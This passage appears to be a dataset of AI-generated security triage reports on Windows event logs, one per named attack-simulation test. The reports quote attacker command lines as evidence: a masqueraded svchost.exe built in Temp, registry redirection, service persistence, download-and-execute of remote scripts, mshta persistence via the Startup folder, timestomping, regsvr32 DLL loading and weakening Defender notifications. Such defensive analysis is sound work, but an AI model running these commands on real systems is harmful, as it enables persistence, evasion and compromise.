- The evidence indicates potentially malicious activities within the logs, primarily revolving around unauthorized user creation, privilege escalation, and temporal discrepancies. The use of PowerShell to create a user suggests a critical risk that warrants immediate attention. When combined with suspicious time alterations and group privilege modifications, the likelihood of malicious intent is heightened.

### Threats or Risks Identified:

- Creation of a new administrator-level user without a password.
- Possible concealment of actions through time manipulation.
- Potential unauthorized access with elevated privileges.
- Possibly camouflaged activity using legitimate processes like Edge Update.

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Disable or delete the newly created account ""Administrator "".
   - Conduct a full audit of current user accounts and privileges.

2. **Investigation and Mitigation:**
   - Investigate why the time change occurred; check for any further system-wide or specific application logs around this time.
   - Review PowerShell execution policies and logs to identify any further evidence of unauthorized scripts.
   - Conduct a thorough review of `admin_test` account activity and credentials.
   - Verify the integrity and origin of `MicrosoftEdgeUpdate` instances.

3. **System and Policy Hardening:**
   - Ensure logging and monitoring are correctly configured and exhaustive for PowerShell and user management activities.
   - Reinforce policies around administrative account creation and privilege assignment.
   - If feasible, isolate the affected system from the network pending a complete forensic audit.

### Resolution:

- **MALICIOUS**: Based on the identified unauthorized account creation, time manipulation, and potential privilege escalation, this activity is assessed to be malicious. Immediate remediation steps are recommended to contain and investigate further."
Masquerade as a built-in system executable,"Upon reviewing the provided logs, several indicators point towards potentially malicious activity. Let's break this down by examining specific events:

### Suspicious Activities Identified:

1. **PowerShell Activity:**
   - The PowerShell logs show execution of a script creating a `.NET` class, compiling it to an executable (`svchost.exe`), and running it from the Windows temp directory:
   ```powershell
   Add-Type -TypeDefinition @'
   public class Test {
       public static void Main(string[] args) {
           System.Console.WriteLine(""tweet, tweet"");
       }
   }
   '@ -OutputAssembly ""$Env:windir\\Temp\\svchost.exe""
   
   Start-Process -FilePath ""$Env:windir\\Temp\\svchost.exe""
   ```
   - Creating and executing files in the Temp directory using PowerShell is a common tactic used by adversaries to run malicious code in memory, bypassing traditional security measures.

2. **Sysmon Logs:**
   - There is a record of the execution of `C:\Windows\Temp\svchost.exe`. The `svchost.exe` file executed from the Temp folder is unusual and may indicate that this executable could be malicious as legitimate `svchost.exe` files are typically located in `C:\Windows\System32\`.
   - Parent-child relationships involving PowerShell and this unusual `svchost.exe` path suggest execution of potentially unwanted or dangerous scripts.

3. **Credential Operations:**
   - Security logs show repeated access attempts to credentials with a return code of ""3221226021"", indicating possible unauthorized attempts to access credentialed resources.

4. **Use of .NET Compilers:**
   - The Sysmon logs show that `csc.exe` and `cvtres.exe` were involved in creating and processing a Visual C# executable within a short time frame from the suspicious PowerShell event. This compilation activity aligns with the creation of a .NET assembly as denoted in the PowerShell logs.

### Assessment:

Given these observations:
- The manipulation to produce and execute an unrecognized `svchost.exe` in a non-standard directory using PowerShell scripting aligns strongly with behaviors seen in malware, especially fileless malware attacks.
- Such high-level console and scripting activities should have legitimate business or administrative utility contingencies, which are not evident here.

### Resolution:

**Resolution: MALICIOUS**

This activity indicates a high risk of compromise due to the observed PowerShell scripting to execute suspicious code patterns indicative of potential backdoors or other malicious payloads.

### Guidance on How to Proceed:
1. **Immediate Isolation:**
   - Isolate the affected host (Server002) from the network to prevent lateral movement or further execution of potentially harmful scripts.
   
2. **Thorough Investigation:**
   - Perform a detailed forensic investigation on `Server002`.
   - Check for indicators of persistence mechanisms, other OS or file alterations, and potential data exfiltration channels.

3. **Malware Removal:**
   - Remove the suspected malware files and any related artifacts identified during the investigation.
   
4. **Security Enhancement:**
   - Review and enhance PowerShell logging.
   - Consider restricting PowerShell execution policies to reduce risk and manage the use of developer tools and .NET compilers on servers.

5. **User and Credential Review:**
   - Reset or verify user credentials that may have been involved in the activity.
   
6. **Report and Notify:**
   - Report the incident to relevant internal and possibly external authorities for compliance, audit, and traceback efforts.

These steps will help mitigate immediate threats while preventing future occurrences of such incidents."
Event Viewer Registry Modification - Redirection Program,"**Analysis of the Provided Windows Event Logs:**

**Observations:**

1. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are being executed by the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate command-line utility for retrieving information about event logs and publishers, its frequent execution can be suspicious, particularly if not typically associated with this user’s activities.
   - Execution of `cmd.exe` with a command-line argument that modifies the registry key to redirect the Event Viewer using `notepad.exe`. This is a potential sign of a Registry persistence technique or an attempt to intercept or manipulate log data.
   - The presence of `reg.exe` execution with the command modifying the Event Viewer registry key, supporting the aforementioned suspicion of registry manipulation.
   - The execution of `whoami.exe` and `hostname.exe` are common for querying system information, potentially indicative of reconnaissance activity.

2. **Security Logs:**
   - Multiple logon events (`4624`) and privileged logon events (`4672`) for the user `admin_test` using NTLM authentication from a remote address (`192.168.0.102`), suggesting remote access. The IP address does match a local address range, thus it corresponds to an insider or within the local network.

3. **System and Application Logs:**
   - Time changes observed in the Kernel General log (`EventID: 1`) indicate small-time adjustments which are not uncommon during synchronization but should be understood in context with other potentially malicious activities.

**Assessment:**

The activity pattern suggests attempts at reconnaissance and potential persistence setup by modifying critical registry keys associated with logs. This behavior, along with remote logins from a potential unauthorized source, points towards potentially malicious activities rather than routine system maintenance.

**Resolution:**

- **Resolution: MALICIOUS**

Given the suspicious registry modifications targeting Event Viewer handling and several instances of reconnaissance commands, an insider threat or a compromised insider account is a reasonable assumption. Immediate action should be taken.

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Isolate `Server002` to prevent further potential compromise or exfiltration of data.
   - Alert IT Security and Incident Response teams for immediate analysis.
   - Force a password change and review the recent activity of the user `admin_test`.

2. **Further Investigation:**
   - Conduct a detailed forensic analysis on `Server002` to determine the full extent of activities performed through the `admin_test` account.
   - Check for potential footholds or additional system modifications.
   - Review other servers and user accounts for similar patterns or lateral movement.

3. **Mitigation Steps:**
   - Implement additional security controls such as two-factor authentication for remote access.
   - Ensure logging and monitoring systems are capable of detecting and alerting on similar suspicious activities in the future.

Through these actions, the organization can address the potential compromise promptly and develop measures to prevent future incidents."
UACME Bypass Method 34,"Upon reviewing the provided application, Sysmon, and other Windows event logs, the following observations and analysis are made:

1. **Application Log**:
   - The application log entries show the startup and operational activities of legitimate software such as Windows Defender and Microsoft Edge Update.
   - No alarming messages or error codes were present, indicating normal activity from the Software Protection Platform Service and other usual services.

2. **Sysmon Log**:
   - The Sysmon logs reveal a sequence of process creations involving command-line executions, predominantly by processes running under the NT AUTHORITY\SYSTEM user. This includes Microsoft Edge and Microsoft Edge Update processes, which are standard for system updates and maintenance.
   - There is a particular command execution that stands out: `cmd.exe` invocation with the command line `/c echo C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\34 Akagi64.exe`. This type of activity, given the inclusion of the `Akagi64.exe`, might suggest potential intrusion activity related to exploiting or using a known privilege escalation tool often associated with UAC bypass attacks.
   - Multiple `wevtutil.exe` and `conhost.exe` executions are observed. `wevtutil.exe` is a legitimate utility but can be used adversarially for clearing event logs. The frequent executions in a short span without further context do raise suspicion.
   - The `hostname.exe` and `whoami.exe` processes executed are typical utilities but their context of execution and parent-child relationship from `wsmprovhost.exe` suggest administrative context actions.

3. **Analysis**:
   - The overall activities largely reflect routine system operations and applications such as Microsoft Edge Updates.
   - However, the particular command involving `Akagi64.exe` raises a red flag due to its known association with bypassing User Account Control, which could point towards an unauthorized privilege escalation attempt.

4. **Resolution**:
   - **SUSPICIOUS**: While the bulk of activities appear benign, the specific involvement of potential exploit files and the nature of certain commands merit further investigation to assess the system's current state, verify integrity, and eliminate any security risks. The suspicious elements do not irrefutably confirm intrusion or malware but are indicative of anomalous behavior that needs deeper analysis potentially through supplemental logs or system inspections.

**Guidance on Proceeding**:
- Perform a thorough examination of the system to ensure the executable `Akagi64.exe` is not exploited malware.
- Cross-reference with other available security intelligence or tools to check for sign of intrusion or compromise in the system.
- Consider engaging endpoint detection and response (EDR) tools to better monitor and flag any potentially malicious behavior.
- Review relevant security policies, especially around process execution and potential UAC exploits, to prevent future occurrences."
Execution of program.exe as service with unquoted service path,"### Detailed Analysis

### Sysmon Log Events:
1. **Process Creation of `cmd.exe`:**
   - **Process:** `C:\Windows\System32\cmd.exe`
   - **CommandLine:** `cmd.exe /c copy ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.009\bin\WindowsServiceExample.exe"" ""C:\Program Files\windows_service.exe"" & copy ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.009\bin\WindowsServiceExample.exe"" ""C:\program.exe"" & sc create ""Example Service"" binpath= ""C:\Program Files\windows_service.exe"" Displayname= ""Example Service"" start= auto & sc start ""Example Service""`
   - **User:** `SERVER002\admin_test`
   - **IntegrityLevel:** High
   - **Hashes:** SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0

   **Observation:** The execution of a command line that includes processes copy operations and the creation of a new service `'Example Service'` with auto start-up features is particularly concerning. This can be an indicator of an attacker attempting to establish persistence by creating and starting a malicious service.

2. **Service Control Manager Entries:**

   - **EventID 7045:** Indicates the installation of a service with details:
     - **ServiceName:** Example Service
     - **ImagePath:** C:\Program Files\windows_service.exe
     - **StartType:** auto start
     - **AccountName:** LocalSystem

   **Observation:** The creation of a service under the LocalSystem account without a corresponding legitimate reason or deployment event raises red flags for unauthorized service installation.

3. **Additional Process Creation and Activity:**
   - Numerous instances of `wevtutil.exe` and `conhost.exe` are executed by `SERVER002\admin_test`. These are common tools but are often used in malicious activities for log clearing or other administrative tasks.
   
### Security Log: 
- Time modification events:
  - **Event ID 4616:** Changes in system time, though can have legitimate reasons, are often used to bypass time-based security logs. 
  - **User:** `LOCAL SERVICE` changing timestamps could indicate attempts to manipulate log timelines.

### Assessment

The logs exhibit signs of unauthorized service creation using `cmd.exe` to copy and use suspicious executables to create a service (`Example Service`) that runs on startup as `LocalSystem`. Moreover, the time adjustments and frequent usage of administrative tools such as `wevtutil.exe` alongside `conhost.exe` strengthen the suspicion of malicious behavior aiming to tamper and potentially clear logs.

### Resolution: MALICIOUS

Based on the analysis, these logs indicate malicious activity, particularly persistence mechanisms and potential privilege escalation. The creation of unauthorized services and the high integrity level usage by an unexpected account (`admin_test`) without correlating authorized action or patching history suggests malicious intent.

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Disable and investigate the `Example Service`.
   - Check and remove any unauthorized executables or services installed in the system directories.
   - Conduct a malware and rootkit scan to ensure no remnants or backdoors remain.

2. **Further Investigation:**
   - Analyze the integrity and source of the `WindowsServiceExample.exe`.
   - Audit user activities and permissions particularly concerning `admin_test`.
   - Review firewall and network access logs for any unauthorized access or data exfiltration attempts.

3. **Preventive Measures:**
   - Implement strict access controls and regular audits on user accounts.
   - Ensure up-to-date patching and review security configurations for entering unauthorized modifications.
   - Consider implementing additional logging and alerting mechanisms to detect such suspicious activities in the future. 

The above measures should help mitigate the risk and prevent similar incidents from occurring in the future."
Kill Event Log Service Threads,"**Detailed Analysis of Logs:**

1. **System and Security Logs:**
   - The system logs indicate a change in the system time through the svchost.exe process. Time changes can be benign but are often worth investigating due to potential use for anti-forensics.
   - Security logs show a couple of logon events using NTLM authentication for the user `admin_test` from the workstation `DESKTOP-3HL5B2P`. Such activity could be normal if `admin_test` is indeed accessing from that address. However, cross-verification is required to ensure that the connection authenticity is valid.

2. **Suspicious Process Activity:**
   - A Sysmon log reveals the execution of Windows PowerShell with a suspicious command that downloads and executes a script from a public GitHub repository (`https://raw.githubusercontent.com/script/script/f1396c411a867e1b471ef80c5c534466103440e0/script.ps1`). This is a direct indicator of potentially malicious activity as it involves fetching an external script and executing it. Such behavior is commonly associated with malware or other unwanted scripts as it crosses typical security boundaries by downloading and importing a remote script.
   - The PowerShell log confirms this activity with multiple starts and stops of providers and the console host, which aligns with script execution processes.

3. **Privileged Actions:**
   - The account `admin_test` also has privileged rights: `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeDebugPrivilege`, among others which are powerful system privileges. This requires ensuring that the privileges are expected for the user and not being abused.

4. **Application Logs:**
   - Windows Defender was reported to be active throughout the timeframe captured in the logs, although presence alone does not imply that it was not bypassed or misconfigured.

**Assessment:**

- **Threats and Risks:**
  - The execution of a PowerShell command to download and run a script from an external source is a significant security risk. It suggests unauthorized script execution that could lead to system compromise or further exploitation.
  - The temporary change in system timeframes may be used in combination with the other activities to disrupt log correlation or hide specific system actions.

- **Guidance:**
  - Isolate the affected machine to prevent possible lateral movement in case of a compromise.
  - Investigate the source and purpose of the downloaded script and cross-reference with threat intelligence databases for recognition.
  - Validate the user `admin_test` activity logs for legitimacy and ensure all authentication came from expected sources.
  - Review and possibly restrict PowerShell execution policies and monitor further abnormal usage of PowerShell on the network.

**Conclusion:**

- The original logs contain numerous red flags, notably the PowerShell script download and execution, aligning with tactics often seen in initial access or payload delivery in cyber-attacks.
  
**Resolution: MALICIOUS** 

Given the identified potentially malicious PowerShell activity and the high-risk indicators, there is a strong indication of compromise that needs immediate remediation."
Msiexec.exe - Execute Local MSI file with an embedded DLL,"### Analysis and Findings:

Upon reviewing the logs provided, here's a detailed analysis of potential indicators of compromise or suspicious behavior:

1. **PowerShell Activity:**
   - There is a `PowerShell` event showing the execution of `powershell.exe` with the command-line argument `-nop -Command Write-Host CustomAction export executed me; exit`. The use of `-nop` (NoProfile) in conjunction with scripting arguments is often associated with non-interactive execution, possibly indicating malicious intent or scripted tasks. This is particularly suspicious given that PowerShell can be a vector for executing scripts or malware without leaving significant traces.

2. **Process Execution:**
   - We observe several executions of `cmd.exe` with the command line `cmd.exe /c c:\\windows\\system32\\msiexec.exe /q /i ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_DLL.msi""`. This installation from a temp directory seems unusual and warrants further investigation.
   - The use of the `msiexec.exe` command to install something from a user’s local `Temp` directory can be indicative of software distribution but could also be abused for unauthorized installations or malware deployment.

3. **File Details:**
   - The application logs show successful completion of an MSI installation: `""Product: file file Test Installer -- Installation completed successfully.""`. This might correlate with the observed `msiexec` process.

4. **Service and Task Execution:**
   - Multiple `MicrosoftEdgeUpdate.exe` processes are seen, which are usually related to normal software update operations. However, it's important to verify their legitimacy to ensure they haven't been tampered with for unauthorized actions.

5. **Security Log Review:**
   - No explicit security events indicating direct intrusion, such as unauthorized logins or privilege escalations, are observed. However, the logs display privileges being assigned to `SYSTEM`, which is standard and often seen in normal operations.

### Conclusion:

Based on the analysis, certain activities appear potentially suspicious, particularly the PowerShell script execution with parameters designed for stealth operation and the MSI installation from a temporary directory. Such behavior typically warrants further investigation to rule out any compromise.

### Recommendation:
- **SUSPICIOUS**: The logs indicate some irregular activities that need further investigation. Specifically, review scripts running through PowerShell, the origin and intent of the `msiexec.exe` installations, and validate the purpose of the `EdgeUpdate` tasks.
- Conduct a more detailed forensic analysis on the host, focusing on script execution and recently installed applications.
- Ensure robust logging and alert policies to monitor similar activities in the future.

Proceed to investigate these areas in more detail to determine if they represent an active threat or false positives."
Mshta Executes Remote HTML Application (HTA),"After conducting a detailed analysis of the provided Windows event logs, I have identified several indicators of potentially malicious activity. Here's the breakdown:

### Key Observations:

1. **PowerShell Command Execution**:
   - There are repeated instances of a PowerShell command execution indicating the use of `Invoke-WebRequest` to download a file from a remote URL (`https://raw.githubusercontent.com/file/file-file/master/files/data.005/src/data.005.hta`).
   - The downloaded content is saved to `C:\Users\admin_test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\data.005.hta` and subsequently executed using `mshta`, which is a common technique used for launching scripts on Windows.
   - The script includes a delay (`start-sleep -s 15`) followed by an attempt to forcibly terminate the calculator process (`stop-process -name ""calculator"" -Force`), indicating potentially destructive or unauthorized automation.

2. **mshta Execution**:
   - The `mshta.exe` process is invoked to execute the HTA file, which is stored in a Startup directory, meaning it could persist across reboots to maintain persistence or re-execute on startup.

3. **Usage of cmd.exe**:
   - The command prompt (`cmd.exe`) is used to execute `calc.exe`, which is innocuous by itself but in context could be a technique to test script execution or to act as a smokescreen for other activities.

4. **Network Activities**:
   - The establishment and communication with a remote server described in PowerShell events could suggest data exfiltration or remote command execution.

5. **Process Anomalies**:
   - The observed actions involving multiple system processes in rapid succession could be indicative of automated scripting or malware attempting lateral movement or privileges elevation.

### Assessment and Resolution:

Given these observations, the behavior is consistent with tactics used by adversaries for malware deployment, persistence establishment, and privilege escalation. The logs do not conclusively prove harm but suggest a high likelihood of compromise.

**Resolution**: **MALICIOUS**

### Guidance and Next Steps:

1. **Immediate Containment**: Quarantine the affected system (`Server002`) to prevent potential spread or further damage.
2. **Detailed Forensic Analysis**: Conduct a thorough forensic analysis on `Server002` to identify any backdoors, additional payloads, or further compromises.
3. **Credential Review**: Investigate potential credential theft or abuse, especially those connected to `SERVER002\admin_test`.
4. **Network Monitoring**: Review and monitor network traffic for any other anomalies pointing to additional infrastructure being leveraged by the attacker.
5. **Patch and Update**: Ensure all systems are updated with the latest security patches to protect against known vulnerabilities.
6. **Awareness and Training**: Increase awareness among employees about phishing and suspicious activities, as user actions could have led to the initial access. 

Ensure to follow through with these steps promptly to effectively mitigate any potential threats posed by the identified malicious activity."
Windows - Modify file last access timestamp with PowerShell,"Upon analyzing the given Windows event logs, the following findings were noted:

1. **PowerShell Activity:**
   - There are multiple PowerShell execution logs with the command: 
     ```
     powershell.exe & {Get-ChildItem ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.006_timestomp.txt"" | % { $_.LastAccessTime = ""01/01/1970 00:00:00"" }}
     ```
   - The command manipulates the last access time of a file, which is an indication of potential timestomping activity. Timestomping is a technique often used by attackers to alter file timestamps to evade detection and hinder forensic analysis.

2. **Sysmon Activity:**
   - The Sysmon logs show the PowerShell process being executed by the `SERVER002\admin_test` user, which matches the suspicious PowerShell activity previously noted.
   - Several `conhost.exe` and `whoami.exe` processes executed by the same user, `admin_test`, are recorded. While their execution alone is not inherently malicious, in conjunction with the suspicious PowerShell activity, it may point towards malicious behavior.
   - The execution of `wevtutil.exe` is also logged multiple times, often used in log manipulation activities. While not enough by itself to confirm malintent, it should be considered given the context.

3. **Assessment of Findings:**
   - The use of a PowerShell script to modify file timestamps is a red flag. This could be an attempt to cover tracks or manipulate logs within the system.
   - The use of the `admin_test` account for these operations suggests that the attacker might have compromised or is misusing a legitimate account with administrative privileges.

**Conclusion:**
The activities observed within the logs are indicative of potential malicious actions, specifically related to the obscuration of malicious activities through timestomping techniques. The overall context suggests either inappropriate use of administrative tools or direct malicious intent.

**Final Resolution: MALICIOUS**
- Given the confirmed usage of a technique (timestomping) typically associated with malicious activities, coupled with the other potentially dubious operations, the conclusion is that these logs contain evidence of malicious activity.

**Next Steps:**
- Investigate the `admin_test` account for any unauthorized access or misuse.
- Check for any other signs of compromise in the system, such as unauthorized changes or suspicious network activity.
- Conduct a full forensic analysis of the affected system to uncover the full scope and extent of the malicious activity.
- Consider deploying additional monitoring or endpoint detection tools to catch similar events in the future."
Disable Windows Error Reporting Settings,"After thoroughly analyzing the provided logs, the following observations and interpretations can be made:

### Security Log Analysis:
1. **Event ID 4616 & 1 (Security & System)**: These events show potential time manipulation on the system. The system time was adjusted backward. While this can occur due to legitimate synchronization with a time server, it could also indicate attempts to manipulate log timestamps, which is often associated with malicious activity.
   
2. **Event ID 4672**: This event shows a privileged logon with various high-level privileges assigned to the `admin_test` account. Although seeing privileged access is normal for administrators, the combination with time change events demands further scrutiny.

3. **Event ID 4624 Logon**: The `admin_test` user, who has special privileges, logged onto the system using NTLM authentication type. This access itself isn't inherently suspicious, but it may need closer examination in the context of other events.

### Sysmon Log Analysis:
1. **Process Creation**: There are multiple instances of `wevtutil.exe`, `conhost.exe`, and `cmd.exe` being invoked by the `admin_test` user, including the execution of a `reg.exe` command to disable Windows Defender enhanced notifications. Such actions could indicate an attempt to reduce system defenses, which is typical behavior seen in malware or attackers trying to maintain persistence or execute additional steps unnoticed.
   
2. **Command Execution**: A specific `cmd.exe` invocation involves modification of the Windows Defender settings, which is generally considered suspicious unless justified by an administrative task. These registry key modifications indicate possible intention to suppress security alerts, commonly associated with malicious intent.

### Overall Assessment:
- **Privilege Escalation & Credential Use**: The `admin_test` account was used to execute commands with high integrity, involving Windows Defender tuning. This could potentially be an insider threat or compromised account abuse.

- **Administrative Actions**: Though execution of utilities like `wevtutil.exe` and access to privileged operations can be legitimate for maintenance, when combined with time manipulation and registry modifications, it increases the risk level.

### Conclusion:
Given the modifications to critical system settings reducing defensive capabilities and time changes potentially masking actions, the activity observed in these logs can be categorized as suspicious and worthy of further investigation.

### Resolution:
- **SUSPICIOUS**: The simultaneous use of high privileges, time manipulation, and security defense modifications warrant deeper analysis to confirm the legitimacy of these actions.
  
### Recommended Actions:
1. **Conduct a Thorough User and Account Investigation**: Verify the legitimacy of actions performed under the `admin_test` account, including checking logon times, associated IPs, and any abnormal behavior.

2. **Check for Known Threat Indicators**: Use threat intelligence and antivirus to scan for known indicators associated with the command and software patterns observed (e.g., `reg.exe` and defensive measures disablement).

3. **Monitor and Alert for Anomalies**: Set alerts for behavior indicative of privilege escalation, suspicious command-lines, or registry changes — particularly those targeting antivirus settings.

4. **Implement Security Best Practices**: If not present, ensure logging of enhanced security logs like PowerShell which might uncover obfuscated command execution not visible in other logs."
Disable Powershell ETW Provider - Windows,"**Detailed Analysis of the Logs:**

Upon reviewing the logs, several events stand out that indicate potentially suspicious or malicious activity. Here is a breakdown of these findings:

1. **PowerShell Activity:**
   - The logs reveal PowerShell executing with command-line arguments that include a path to `pstools\script.exe` and subsequent commands to update traces using `logman`. The usage of cmd.exe to execute further commands is a common technique for attackers to execute scripts, and the presence of `pstools` (PsTools) and specific command-line switches such as `-accepteula -i -s` indicate potential remote or unauthorized control activity.
   - These command-line invocations are attempting to make changes to the trace logging for PowerShell events (`logman update trace`). This behavior could be used to cover tracks or modify system logging in a suspicious manner.

2. **Sysmon Logs:**
   - Sysmon logs show the execution of `powershell.exe`, `conhost.exe`, and `cmd.exe` in conjunction with `pstools\script.exe` by the user `admin_test`, indicating potential misuse or a compromised account conducting these activities.
   - The process `PSEXESVC.exe` being installed as a service suggests the use of PsExec, a Sysinternals tool often used for executing processes remotely. This tool's execution under `NT AUTHORITY\SYSTEM` points towards activities that could involve privilege escalation or lateral movement.
   - Execution of `externalfiles\pstools\script.exe`, which is associated with remote execution, raises red flags regarding unauthorized access or execution attempts.

3. **Service Creation:**
   - The System log contains an entry regarding the manual start of `PSEXESVC`, which is often associated with PsExec. This kind of service can indicate the execution of remote administrative tasks or potentially harmful operations without direct physical presence.

4. **Microsoft Edge Update Entries:**
   - Although frequent executions of `MicrosoftEdgeUpdate.exe` are observed, these operations align with auto-updates which are normal. However, correlating these with potentially suspicious points mentioned above can be part of an attack strategy to disguise malicious operations under legitimate software execution.

**Assessment of the Situation:**

- The use of PowerShell and PsExec tools, with script execution and changes to logging configurations, is highly indicative of potential malicious activity. These logs suggest possible unauthorized remote administration, privilege escalation, and attempts to manipulate event logging to conceal actions.

**Resolution:** MALICIOUS

**Guidance on How to Proceed:**

1. **Immediate Containment:**
   - Isolate the affected host (Server002) from the network to prevent potential propagation of the threat.
   - Change credentials for the accounts in use during these events, particularly `admin_test`.

2. **Detailed Forensic Analysis:**
   - Conduct a comprehensive forensic analysis of the server to examine file integrity, running processes, and network connections for additional indicators of compromise.

3. **Review Security Policies:**
   - Evaluate and tighten security policies, especially around the use of privileged tools like PowerShell and PsExec. Implement just-in-time access and least privilege principles.

4. **Monitoring and Reporting:**
   - Enhance monitoring of PowerShell scripts and remote execution tools.
   - Report and collaborate with the Incident Response Team to further investigate and address any potential breaches immediately.

5. **Implement Improved Detection:**
   - Deploy additional detection rules in SIEM for anomalous behavior involving PsTools and PowerShell use, focusing on unusual command-line activities."
Regsvr32 local DLL execution,"Upon reviewing the Windows event logs provided, let's break down the observations and assess whether any activity is benign, suspicious, or malicious.

### Summary and Analysis:

1. **Windows Defender Status:**
   - In the Application logs, Windows Defender appears to be consistently in an ""ON"" state (`SECURITY_PRODUCT_STATE_ON`), indicating that the endpoint protection is active and functioning.

2. **Edge Update Activity:**
   - Numerous entries in the logs are related to Microsoft Edge Updating processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`, etc.). While the sheer volume of Edge Update activities could appear suspicious due to numerous process creations, they generally align with expected behaviors of software update processes, particularly for a Microsoft product.

3. **Process Execution:**
   - The command line executions involving tools like `powershell.exe`, `whoami.exe`, and `cmd.exe` are notable:
     - A command executed using `cmd.exe` with `regsvr32.exe` stands out:  
       `""cmd.exe"" /c IF ""%PROCESSOR_ARCHITECTURE%""==""AMD64"" (C:\Windows\syswow64\regsvr32.exe /s C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\bin\AllTheThingsx86.dll) ELSE ( C:\Windows\system32\regsvr32.exe /s C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.010\bin\AllTheThingsx86.dll )`
     - The use of `regsvr32.exe` to register DLLs from temporary directories is suspicious due to past abuse of `regsvr32` for executing arbitrary code. This could be indicative of a potentially malicious activity, particularly if ""AllTheThingsx86.dll"" is not a recognized or authorized library.

4. **System Integrity and User Behavior:**
   - Multiple processes are executed under the user `SERVER002\admin_test` at a high integrity level. The nature of processes such as `wevtutil.exe` and the context of their execution should be further scrutinized to ensure they align with legitimate administrative tasks.

5. **Presence of Sysmon Logs with Anomalies:**
   - Sysmon logs capture various process execution events, particularly focusing on console applications (`conhost.exe`, `cmd.exe`), management utilities (`hostname.exe`, `whoami.exe`), and several Edge update-related events. The context and frequency, especially around the `cmd.exe` invocation, do warrant further exploration.

### Assessment:

- **BENIGN:** The on-state of Windows Defender and expected Edge Update processes represent normal underlying system activity.
- **SUSPICIOUS:** The use of `regsvr32.exe` for deploying or registering DLLs from temporary directory paths without a clear indication of their legitimacy raises a red flag. This is a known tactic for executing malicious code.
- **MALICIOUS:** At this point, without additional context or file analysis (e.g., checking what specifically ""AllTheThingsx86.dll"" does), it is not conclusively malicious, but it warrants concern.

### Resolution:

**Resolution:** **SUSPICIOUS**

The logs contain activity involving `regsvr32.exe` executing from a temporary location with a non-standard DLL (`AllTheThingsx86.dll`). This needs further investigation to determine if this DLL is legitimate or indicative of compromise. An analysis or scan of the `AllTheThingsx86.dll` file should be conducted, and logs should be correlated with any recent unusual behavior on the network or alerts from antivirus tools."
SIP (Subject Interface Package) Hijacking via Custom DLL,"Upon analyzing the provided logs, I have identified several events that warrant further attention due to their potential implications for system security:

### Observations:

1. **PowerShell Activities:**
   - Two instances of PowerShell commands were executed with restricted execution policies. One command searches for specific sections within `.inf` files using regex which can, in specific scenarios, indicate attempts to exploit driver installations or validate presence of vulnerable setups: 
     ```powershell
     $Res = 0; $Infs = Get-Item -Path ($env:WinDir + '\\inf\\*.inf'); foreach ($Inf in $Infs) { $Data = Get-Content $Inf.FullName; if ($Data -match '\\[defaultinstall.nt(amd64|arm|arm64|x86)\\]') { $Res = 1; break; } } Write-Host 'Final result:', $Res;
     ```
   - Legitimate usage might be possible, but the presence of these checks indicates a need for further investigation into their origin and intent.

2. **Regsvr32 Incident:**
   - The use of `regsvr32.exe` to register a DLL (`GTSIPProvider.dll`) located in a temporary directory is concerning:
     ```
     ""cmd.exe"" /c regsvr32.exe C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\bin\\GTSIPProvider.dll
     ```
   - This action is often associated with setup or malware persistence mechanisms. Running DLLs from a temporary directory via regsvr32 could be used to bypass certain security mechanisms.

3. **Administrative Privilege Usage:**
   - There are multiple instances of elevated token usage (Event ID 4672) linked to the user `admin_test`. Regular maintenance activities could explain this, but it could also be indicative of malicious usage.

4. **Network and Credential Events:**
   - Repeated Security events for credential enumeration (Event ID 4798) are noted involving multiple users like `Administrator`, `admin_test`, and others within the system. This might indicate possible reconnaissance activities to gather credentials for privilege escalation.

5. **System and Application Activity:**
   - Frequent updates related to Microsoft Edge are present, which alone appear regular; however, thorough vetting of accompanying PowerShell and `regsvr32` use is advised.
   - An excessive number of security logons (Event ID 4624) and privilege assignments occurring frequently in short durations to the same cycle of services, possibly normal in a highly transactional environment, but warrants closer inspection when combined with other anomalies.

### Assessment:

The logs reveal points of potential security interest. The PowerShell executions, Regsvr32 registration of temporary DLLs, frequent use of elevated privileges, and recurrent security events suggest potential suspicious activities that could pose a security risk.

### Resolution:

**SUSPICIOUS** - While direct evidence of compromise was not observed, the elements identified necessitate a deeper investigation to ensure that these activities aren't attempts to compromise or exploit the system. Specifically, further analysis on the origins and purposes of the PowerShell commands, the context of Regsvr32 execution, and the intent behind repeated privileged activities would be prudent. Monitoring for any correlated threat intelligence or patterns known to be associated with these activities should also be a priority."
Modify RDP-Tcp Initial Program Registry Entry,"Upon careful analysis of the provided logs, the following observations can be made:

### System Log
- The system logs primarily contain Kernel-General events related to time changes. The time was adjusted via the `svchost.exe` process, which is typical for system time synchronization tasks and often performed by the Windows Time Service.
- Events from the Microsoft-Windows-Time-Service also indicate routine time synchronization activities with `time.windows.com`.

### Application Log
- `Microsoft-Windows-Security-SPP` and `edgeupdate` service activities appear standard for software maintenance.
- The `Software Protection Platform Service` (SPP) events are related to license management, which is typical for Microsoft environments.
- EdgeUpdate service stopping is not uncommon and typically corresponds to software update tasks.

### Security Log
- A privilege escalation event (`EventID 4672`) for `admin_test` showing powerful privileges such as `SeDebugPrivilege` is notable, but isn't necessarily malicious without further context.
- Event `4624` shows successful NTLM logons, which are routine but could be indicative of lateral movement if sourced from suspicious IPs. The logon via `fe80::e3b5:5371:12a8:9c77`, which is a link-local IPv6 address, often seen in internal network communication.
- The sequence of logoffs (`EventID 4634`) and logons are typical of a session logon/logout cycle.

### Sysmon Log
